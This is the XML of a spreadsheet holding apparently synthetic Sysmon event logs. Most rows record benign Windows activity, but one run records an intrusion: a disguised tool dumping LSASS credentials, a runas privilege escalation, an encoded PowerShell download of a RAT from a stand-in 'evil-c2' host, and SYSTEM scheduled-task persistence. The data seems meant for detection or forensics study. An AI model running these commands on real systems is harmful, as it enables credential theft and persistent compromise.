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49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7.997cm"/>
    </style:style>
    <style:style style:name="co11" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="4.011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6.899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3.249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7.198cm"/>
    </style:style>
    <style:style style:name="co18" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="6.981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6.055cm"/>
    </style:style>
    <style:style style:name="co21" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="7.634cm"/>
    </style:style>
    <style:style style:name="co22" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="7.008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2.078cm"/>
    </style:style>
    <style:style style:name="co25" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.378cm"/>
    </style:style>
    <style:style style:name="co26" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.732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smon_event_lo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 calcext:value-type="string">
            <text:p>UtcTime</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>EventID</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ProcessGuid</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Process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ileVersio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riginalFileName</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CommandLine</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CurrentDirector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onGuid</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>LogonId</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>TerminalSessionId</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IntegrityLevel</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Hashes</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ParentProcessGuid</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ParentProcessId</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ParentImage</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ParentCommandLine</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>TargetObject</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GrantedAccess</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SourceIp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DestinationIp</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>DestinationPort</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>DestinationHostname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string" calcext:value-type="string">
            <text:p>2023-10-27 12:28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aa1f5d31-38b6-4b1f-b0f0-3fe33b935aed}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:\Windows\System32\notepa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notepa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756b018bfcb53b20acb0efa29132a11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3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7970fa7-eea2-43ce-9b67-f7152e51f6a5}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31a091260c90f8109921e1ebcc77a7d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33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96fefd2-54e1-4369-8ab5-bd577924d05f}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f921679861826ceeea9c05e9671b104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36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b30bdcf-ed94-4b01-be8b-2925b395aad4}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0e856c24124a9e4b8dbba0cce637bd7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3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46bd597-1b2f-4a37-b18e-504bbc5c2c1f}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19b0a1295a6413107deca2ca55735a2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a54ad5c-8bdf-4471-8747-2ee956891dc8}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037d408d0c9fcef1962fe21eea54c8c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1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19459f3-104b-4e94-967e-fa2e64aa48eb}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="6847" calcext:value-type="float">
            <text:p>6847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bfc6815f17815fc9998b4e353a861c13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3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29d9101-fe20-45fb-b032-90ada3b65c21}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bf33dbb2eff8ef39579e836e239898e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4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6bd6574-5531-4202-b57c-313837470dd1}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="7952" calcext:value-type="float">
            <text:p>7952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29d24129789814a6eb1ee1d08390e4e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6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7b288b3-3223-4588-a93c-279845ced495}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37e167cc80d55ab675a450ef5ed1f1c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8:0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64b73d5-643e-4c1e-82eb-ac1f435da6da}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="8389" calcext:value-type="float">
            <text:p>838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dcff778-e50b-4d8c-b3f4-4ba00beb86d2}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x87d16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3bb93874412376640acb46dc220155e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4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dee7656-8e87-49b0-a0d3-d4e6768fcf13}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5f09f89f71f9bd5ca6493eb4e6ef219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1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9f80413-6e8a-4e93-91ef-3dac44eb5da5}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dcff778-e50b-4d8c-b3f4-4ba00beb86d2}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x87d16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188837feb6dd0542b63a2e401a60751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3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acd9112-273a-4c74-ae4a-1c11d9bdae5b}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="8338" calcext:value-type="float">
            <text:p>8338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c5aca4c5aa2720ac7b206821cb3a28ae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3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ef0bf1d-e3b6-4a49-a446-fcce9c8e766a}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af0bfcf57b8d41045ffce4622b10ad4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5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03a4003-34bb-46a9-a36e-85f501c359b1}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c33f09bc5c988d4c14858283dd911c9b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8643546-7252-4de9-8913-797243269e26}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c46b8552116493693ffcee4c2725f21c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2:5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1b56a4b-edd9-4016-90ec-ac92bfbaabff}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2571e548e3356149ad1578aa38856fe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2b39b89-82b8-466c-a614-230f66aa6522}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e2243dee82c540b1f3631a7e9705fc4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05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ccfbda0-594a-4091-a382-b100d768b314}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1f82209a83dd8458a3d369780366352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08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4f3eac5-d369-467c-8138-796e8c695b62}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="6479" calcext:value-type="float">
            <text:p>6479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d8a3dcaa00fe4155aae0de013297934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0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5b21894-950e-4deb-9be7-de5dccd30835}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250df03-597e-4c61-bec3-fb89b24a6e0c}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xe98a1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13b72156c7be5eec38a7947918bbc5e</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{0e983e7d-81dd-4a41-bad3-b40d9b72fb33}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0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3133cb7-0df0-4634-892e-07b926038a17}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dcff778-e50b-4d8c-b3f4-4ba00beb86d2}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x87d16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5878d3a6458cac31ba6e7041a6eab0d</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{864b73d5-643e-4c1e-82eb-ac1f435da6da}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="8389" calcext:value-type="float">
            <text:p>838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1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afa97e3-538d-4824-bdd9-6d9894c5c062}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25acf03dd21aeb98f3dc28dd6a13d55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15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d3d75d5-ea97-41a1-9686-71438ec13992}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989b1254f22362d4a9263cdbb508fa06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1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2569bf4-762c-4338-a1f5-cd0e4e990866}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b79ee3a443f5be8f45d84789e196952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18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34a6b84-e03b-4200-9d9b-8963e15299a6}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bb46a616c5e4c3d4b9e8a279ffa44f8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1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ee176fe-e017-474b-8c1c-46bbd7214219}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34830726be62e7b5b6b0f954fd1e5a2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29:0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a125f5a-92a5-4f05-886d-6c834195f343}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f181766-7634-4497-b189-eb83fc7fd872}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x53b0ea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003caca825492d5cc12ace0fdf2d812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3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8f575d0-d225-4101-97e5-2ba3e488e52b}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f181766-7634-4497-b189-eb83fc7fd872}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x53b0ea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d4a7818c9fa06212325d529a0cfadaf</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{1a125f5a-92a5-4f05-886d-6c834195f343}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31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8d23882-5cb7-46bf-8626-2f723afe7cb4}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notepa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bf181766-7634-4497-b189-eb83fc7fd872}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x53b0ea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a82cfbad1ed108111d9c959cf14029e</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{1a125f5a-92a5-4f05-886d-6c834195f343}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34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f2f1fc6-eecf-4dc6-ab1b-e3f9452a9738}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="7624" calcext:value-type="float">
            <text:p>7624</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\System32\notepa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notepad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e46e3e0318da5b4a9d4d3f98cde35c7c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3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372769a-c4b5-40da-8976-e7e17d64e661}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e96e48cb2bd0d70bcf5b75f5df0f4d0a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4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ef7d260-3a21-4123-9f8e-60ddb2753a91}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="7851" calcext:value-type="float">
            <text:p>7851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explorer.exe,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a18dcfe4c57f69b427ed7e2aa6c8d4e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42:0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721e89c-82bd-4d22-8a32-06236378a067}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e75df688-3fc9-42a7-bb5e-0757981c8e92}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xf82295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fe570cb4b2b49bd75b270aa2ad94329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46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78fa5dc-845e-4db6-9fe8-26a98e7a5b7d}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13f86dab0914176a67ff45c2fb4a781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4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0408a49-e456-4dbc-9dd9-b0c3eb6401eb}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c4262945cf1e2961b9840bd06dec050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4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a781097-0d40-4830-ab03-155e92931072}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e75df688-3fc9-42a7-bb5e-0757981c8e92}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xf82295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c13a17e32f9eb2cb3b2479c355bfeea</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{9721e89c-82bd-4d22-8a32-06236378a067}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52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5606419-09b8-463a-b390-a704c0c58b2c}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="9959" calcext:value-type="float">
            <text:p>9959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notepa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47ad3eff32e573d10aed7ede13dd0f3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56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4748dff-bf78-41eb-bcdb-d5176950e2bf}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C:\Windows\System32\notepa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notepad.exe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efdcc72442043e7a7351520956e887a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57:0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7ab77203b001f273760a0d1034668bb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3:59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7800aef-eedb-46de-8780-a0fed4fbb3cf}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bea962251dceeaa27298e2619e33de4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2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de9b4ca-6da2-416c-a04f-d7862dd5e57f}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cc511a0500a0534af20858f25d3c854c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2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934782e-0864-47b5-8f2e-64bddb18087b}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e75df688-3fc9-42a7-bb5e-0757981c8e92}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xf82295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8f98579e95e4b9449813109b70f52eb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{9721e89c-82bd-4d22-8a32-06236378a067}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3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3aa7d1c-3835-41e7-b2b4-c9da0c3c5232}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="7824" calcext:value-type="float">
            <text:p>7824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e5a5456b09520462d4d90d5200559d5e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6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990b7bc-a753-40a6-aaf2-88d59ab9b940}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b6b6ae881e01cda6b7c9dce0e24cc03c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a448783-4f53-489c-8dab-0beb09b86ed8}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="9855" calcext:value-type="float">
            <text:p>9855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spaint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392e45cf-6558-46d8-a770-deaa9a5ffdb3}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x0c3544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134067722bad3121abad4e4e6c4e83d</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{347ee94e-118a-4630-abb4-46b06d5bb05a}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7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6162e3a-b5bf-40a6-84a5-74f32bfad409}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d5ccfe336e37eec1563849b58d9f60b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08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3f6889d-590a-4458-a8b4-10dfc7fa3066}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="9594" calcext:value-type="float">
            <text:p>9594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spaint.exe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323557d6-58c7-49b4-ac8e-e4df268b151c}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x386db8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24cd6a2693b430f49f9bfe170af9af8</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{aa0481b8-d5f9-4cbb-8a5c-43c27cd787ba}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5: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plorer.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>cm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5a7dfe04507e9d75bc3130bbcade329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5:4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b5a2a28e-ae5c-4756-9fda-347fa0984d5b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md.exe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7ea65cf688380b331b2033da6755b41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5:4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970d249-a8d1-404c-9773-65c52892b429}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C:\Windows\System32\whoami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hoami.exe</text:p>
          </table:table-cell>
          <table:table-cell/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b8570f1ce629731fa42f4aea48ddce39</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{b5a2a28e-ae5c-4756-9fda-347fa0984d5b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6:40.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b5a2a28e-ae5c-4756-9fda-347fa0984d5b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:\Windows\System32\cmd.exe</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="4"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>C:\Users\jdoe\Downloads\updater_tool.exe privilege::debug sekurlsa::logonpasswords exit</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>jdoe</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>C:\Users\jdoe\Downloads\updater_tool.ex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3-10-27 14:16:4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0e196c2-27e2-4857-ba2f-26bcc3314e29}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C:\Users\jdoe\Downloads\updater_too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updater_tool.exe</text:p>
          </table:table-cell>
          <table:table-cell/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53c118b469a9b548652ce83662f9f5c</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{b5a2a28e-ae5c-4756-9fda-347fa0984d5b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6:42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e0e196c2-27e2-4857-ba2f-26bcc3314e29}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C:\Users\jdoe\Downloads\updater_tool.exe</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="4"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>runas /user:administrator /savecred "cmd.exe"</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>jdoe</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\System32\lsass.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x1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3-10-27 14:18:4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ff9dedc-7ad2-4bb1-93f9-0c74fb083c67}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C:\Windows\System32\runas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as.exe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45a088a6d8b66d1a54989e929ff49a4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{b5a2a28e-ae5c-4756-9fda-347fa0984d5b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8:4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5eb075f-9b76-425a-8b66-a098ecbac8c7}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C:\Windows\System32\cm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md.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAMgAuAGMAbwBtAC8AcgBhAHQALgBlAHgAZQAnACwAIAAnAEMADQAKADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHMAdgBjAGgAbwBzAHQALgBlAHgAZQAnACk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Administrator</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{1a0290e5-7e38-47b4-9c5a-abc09542fa2f}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x8160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D5=ea9958645cf04a3f2f11792e3d183124</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{5ff9dedc-7ad2-4bb1-93f9-0c74fb083c67}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C:\Windows\System32\runas.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>runas /user:administrator /savecred "cmd.exe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8:58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79072f9-054b-487d-bde1-223c4ae78b50}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C:\Windows\System32\WindowsPowerShell\v1.0\powershel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owershell.exe</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\System32\</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CORP\Administrator</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{1a0290e5-7e38-47b4-9c5a-abc09542fa2f}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x8160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D5=ad209967856911acb81ed5476fb6d7cd</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{25eb075f-9b76-425a-8b66-a098ecbac8c7}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="6640" calcext:value-type="float">
            <text:p>6640</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2" office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\System32\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8:59.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79072f9-054b-487d-bde1-223c4ae78b50}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C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="4"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\Temp\svchost.exe</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Administrator</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="11"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>192.168.1.10</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="57844" calcext:value-type="float">
            <text:p>57844</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>198.51.100.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2023-10-27 14:19:0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4eb6fce-db4b-4850-a14f-1d77d9fedcd5}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C:\Windows\Temp\svc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vchost.exe</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\System32\</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CORP\Administrator</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{1a0290e5-7e38-47b4-9c5a-abc09542fa2f}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x8160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D5=eb2d93c092a77e1fba945babeb6b0792</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{25eb075f-9b76-425a-8b66-a098ecbac8c7}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="6640" calcext:value-type="float">
            <text:p>6640</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2" office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\System32\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19:04.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4eb6fce-db4b-4850-a14f-1d77d9fedcd5}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C:\Windows\Temp\svchost.exe</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="4"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>schtasks /create /sc minute /mo 30 /tn "WindowsHealthCheck" /tr "C:\Windows\Temp\svchost.exe" /ru SYSTEM</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Administrator</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="11"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>192.168.1.10</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="58476" calcext:value-type="float">
            <text:p>58476</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>198.51.100.12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2023-10-27 14:1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c010dca-be43-44ab-a2fb-87027b67cf40}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C:\Windows\System32\schtasks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chtasks.exe</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\System32\</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CORP\Administrator</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{1a0290e5-7e38-47b4-9c5a-abc09542fa2f}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x8160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D5=d2001fbd075de60831a73cd2c7e6bb33</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{25eb075f-9b76-425a-8b66-a098ecbac8c7}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="6640" calcext:value-type="float">
            <text:p>6640</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2" office:value-type="string" calcext:value-type="string">
            <text:p>C:\Windows\System32\cmd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21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c6e2cd99-46b1-4496-9d41-76ada27dae4b}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89783eaf3cc23fd3b85bc72be9e2fc8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23:35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96ca2546052462711f9c063a34fdc21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28:35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bf658392bd14d7bd9a86af14613fe376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31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c5fccee3-422d-419b-a687-0331b2a42e9d}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703cbe5374ea07ba6f870835e0449ae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3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0c5e732-dbec-49e9-ad80-a05d0da8f882}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a481abc4b640d22a345dc73a82e561c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3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ecb47da-34ab-4e5a-a793-04dec3cd95b9}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1ff072ef82a96b9bfcb380d1312105a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3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b758abf-936d-4b80-a153-17c9c281f04b}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1aa697ecf335bb946ec13829be269fa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3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80a8e1c-ecfb-489f-8f93-513f8020c645}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104f45396bade1ca9b21ef83122f1a2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2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adbcf93e-76eb-47cc-8924-5847642a5ef5}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cdcc134242d84a0bcff48cf9c040aee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5a34297-c798-4722-9f70-58898bb05818}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3e33611ca2afd37b842ae6aa1c657b3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14fee79-295f-4d24-8416-aae703aef25c}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3f419842856ba0b95d8d60cfaaf18ec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6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c2e4a32-397e-47bb-9070-c8cf07a9a044}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3d0e5e11c1dfa3bddf91ba16fc2c001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87f9a59-b111-4962-99a1-ecaad520f9e2}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9f7a78dd4909f02527a675383e747cc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4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4cc1177-f353-41f7-b926-bcbac76f5a7f}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15c98d9680c10ea770308a394220b89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51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18b661d-fd8e-46bc-9c68-228034cfc776}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7bea80c40304f463ad952f8f72bc787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5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bfe723e2-92ae-4c38-ae7c-d4ece118b75d}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8e7156b9257bc8a73829b3e9ab99b55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56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d70016f-b4c4-456a-afe4-8cc6b8734144}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31ae260124bda8edf7dbac51e0c01b4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5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c623fdb-bd68-433e-abee-a1e4e4468f6d}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be76afaca0aaffe15100ea42978b97ca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4:5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30c8638-134c-4bd5-9aad-7b1012b17cc0}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4927" calcext:value-type="float">
            <text:p>4927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37710e12da2d791108da1be1b8d6ef1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0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c038669-407f-4980-9219-e2547ec9b24f}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="8914" calcext:value-type="float">
            <text:p>8914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486503c5dfdbd50c8c1ab9300832e9c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0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9a43aa9-c36c-4069-9d69-60be924fd385}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625d217e69902b676067d50b3ce9276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0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bb0489a7-4f14-4099-842e-4f4c405d2a47}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dd02fff3265c57535067dd1ecaf3883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0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47d776d-89fb-42bf-9eaf-8f8451f16a63}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859139718b99d8c68ed7b0732e54767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2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ea53944-d3bc-4966-a801-6ced9c25046a}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d95cc284fae9bef9ecc5471cf88d062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b8950361-6b46-4700-b216-c755aba086be}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ceada8fbc771952640594f3ec81d2e5a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cc19011d-4a29-4d8b-9f8f-e768196fbef1}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="9158" calcext:value-type="float">
            <text:p>9158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3ecdd8799ec6a1ac0fd06714d092999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88fb417-e8ff-4cce-b05d-38ef0882379e}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98d02092c8b8cb5a508f40809eb32d3e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3139c04-073c-4180-910d-31ede563c984}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241ad69fad483affc4f009ccb263e7c1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1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c40ed41-e4a1-4f6b-b1b9-22e7e6721e54}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bf9f7efeea05556e3e0439d0987679b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21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90d35a42-8725-4888-9940-1c4fd66cd60d}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9238aa29b3dfce2407241748a450d03a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2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1748c03-6ab2-4cdb-98b8-58ed8cc03520}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d28f79ee76bdf4ef60e5f715756df68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2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c7ce8b99-01a6-4866-a323-adc9a8c14a8b}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89a6c2a1246532e1f3629177740ba569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30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dcece67-dd7d-40cf-b85d-36e3884d6afe}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="7755" calcext:value-type="float">
            <text:p>7755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37399967b1e5edfe8f8b330e42d0d04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3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ae97057-6642-4624-9b5d-68ea92a11bbc}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2c9049d5aa2e6a7768b1f2781199a9b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3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d2ae64b-beb7-4f98-b8eb-8ed4baa20825}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fa081c4e989ec4b39c2357cb592cd805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0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3b97e26-f26e-41d5-928a-f7b614359450}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f6b0737d96ade703edfd1a9593323f4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bc9f1f15-bbcd-41e2-9ab1-77fb3aefa05d}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C:\Windows\System32\notepa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notepa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37ff9a0e024a270822341cb62a29d35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6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e98917c-91c3-4388-bd74-b632272b53fe}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6b2e8018403b77d4bc359bbfc6767d4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9b2ddea-a3f4-4d30-ade5-67c7c2680976}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="8957" calcext:value-type="float">
            <text:p>8957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d0f70cc8a89e54705ebee63827b57e7b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f0861a03-4fdf-4efb-b83a-e3e3cc02df8d}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ed5fbc99c18562da89d79fdebcf2119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4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78063ad6-16bd-4f1d-b44b-70edf5a3d487}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5b23e2dcf8d4c253647eec7e8320311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52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1ce431a-2776-4265-882e-2e213d49ef38}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="5615" calcext:value-type="float">
            <text:p>5615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60269cb0e0b9a49b730545449edc19a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5:5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5490e92-5ffa-43f6-9706-e2528071337c}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4fd7289f22194acf2287b17caa2e575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00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0c9ed29-3e86-4dab-a8e3-dc11dca4debc}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e988b4154bc00543b6f8538eff638e90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01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d5939f27-f63a-431e-a931-7d68cb6effc9}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C:\Windows\System32\notepa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notepad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3d594ffbb6493a757bc242fff0bc038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0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020b3a0-b8ea-4bf8-afdf-7d07a0a21d08}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8301ca9e0846ef4dd895d493d313e4e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0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7460710-50be-4a88-80e3-485969a97092}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f9edf181d2f55ac4170784554aee994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0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6bc84d8b-c5f4-42ec-be7d-2a89899baab1}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C:\Windows\System32\mspain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mspaint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d674acb808b4556387b92991a9240f5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12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e9a0ef0-2b0a-44bc-85cb-0738d6f70337}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C:\Windows\System32\RuntimeBrok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untimeBroker.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>RuntimeBroker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1c88ebfa7f8ad95b5c9313c609c3ea26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1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8c5fb4d-2c3c-4987-ba54-94ebb4d140fe}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af685c2d3d6944062966c2bc748fdfb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1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05cde9d2-f469-4f56-a9c1-d4468a22c4f5}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C:\Program Files\Google\Chrome\Application\chrome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chrome.exe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>"C:\Program Files\Google\Chrome\Application\chrome.exe"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5ae05a8a-b2b4-425c-bbbf-1c808584059d}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0x5125e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8f3062aa165da08042e5bc08f93b7f9</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{4f9f3b5f-d407-4a50-af2d-18e04c24521e}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16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b025eb4-314e-4459-bd10-240a3bbe5270}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C:\Program Files\Microsoft Office\root\Office16\EXCEL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XCEL.EXE</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"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c17f5467-654b-4feb-8d8c-d42e5ef6eb8e}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xcc547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3c65dfc09d749366331779f8addeb320</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>{d08ee80b-665d-4b91-85e3-688f61c09eb6}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1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6e1a47c-542f-4af4-ac8e-873c5c8c1711}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160f90a55a3dfce4d886a1de8fa62a0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28:35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5fad2b0e-ef14-4145-b685-00debd06fbec}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6487a48a-563d-45ca-9b7d-ff18f97baa86}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0xbe99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7fe71d54069cc950f0dcd9d7fcc9acee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2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37749f5-c422-42b3-8fb3-d411b346d4fa}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C:\Program Files\Microsoft Office\root\Office16\WINWORD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WORD.EXE</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
